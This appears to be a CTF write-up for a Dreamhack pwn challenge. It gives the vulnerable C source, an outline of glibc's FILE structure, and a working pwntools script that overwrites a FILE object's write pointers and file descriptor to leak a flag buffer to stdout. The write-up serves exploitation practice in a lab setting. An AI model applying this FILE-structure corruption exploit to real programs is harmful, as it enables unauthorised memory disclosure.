---
title: "[Dreamhack] IO_FILE Arbitrary Address Read - Write up"
date: 2024-01-14 00:00:00 +0700
categories: [Dreamhack, Binary Exploitation]
tags: [pwn, io-file, arbitrary-read, dreamhack]
author: datious
---
# [Write up for Dreamhack]__Challenge: IO_FILE Arbitrary Address Read  
**Author: datious**

iofile_aaw.c
```
// Name: iofile_aar
// gcc -o iofile_aar iofile_aar.c -no-pie

#include <stdio.h>
#include <unistd.h>
#include <string.h>

char flag_buf[1024];
FILE *fp;

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int read_flag() {
    FILE *fp;
    fp = fopen("./home/iofile_aar/flag", "r");
    fread(flag_buf, sizeof(char), sizeof(flag_buf), fp);
    fclose(fp);
}

int main() {
  const char *data = "TEST FILE!";

  init();
  read_flag();

  fp = fopen("./home/iofile_aar/tmp/testfile", "w");

  printf("Data: ");

  read(0, fp, 300);

  fwrite(data, sizeof(char), sizeof(flag_buf), fp);
  fclose(fp);
}

```

- This program allows users to write on to a FILE object structure => Vulnerability.
- Now, let's check protection layers: canary, Relro, Fortify and PIE are disabled. NX is enabled.

1. Analyzing and Gathering
- We will start at the read function. Fp is a file object, and we can write to the file object structure and change the flow of the program.
- A FILE object has a structure like:
```
-flags #Bits Stream status

_IO_read_ptr #read status
_IO_read_end
_IO_read_base

_IO_write_base #write status
_IO_write_ptr
_IO_write_end

_IO_buf_base # Physical memory status
_IO_buf_end

_markers 
_chain #manage streams

_fileno #file descriptor
_flags2
_old_offset
_cur_column
_vtable_offset #stdio functions
_shortbuf[]
_lock    # synchronize stream
_offset
_codecvt
_wide_data
_freeres_list
_freeres_buf
__pad5
_mode
_unused2[]
``` 

- We just need to focus on the write status in this structure.
- When we set **IO_write_base** to the flag_buf address and set **IO_write_end** to flag_buf+1024, the program will perform the next action using the modified fp structure. Instead of writing data to **testfile**, it prints from our targeted memory. (buf_flag).

2. Script

```
#!/usr/bin/python3
from pwn import *

exe=ELF('./iofile_aar_patched',checksec=False)
p=remote("host3.dreamhack.games",17803)
#p=process(exe.path)


flag=exe.sym['flag_buf']
payload=p64(0xfbad1800)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(flag)
payload+=p64(flag+1024)
payload+=p64(0)
payload+=p64(0)
payload+=p64(1024)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(0)
payload+=p64(1) #stdout
p.sendlineafter(b'Data: ',payload)
p.interactive()
```
My test on local machine.
![image](https://hackmd.io/_uploads/ryOa_xEwfx.png)

Goodluck !!!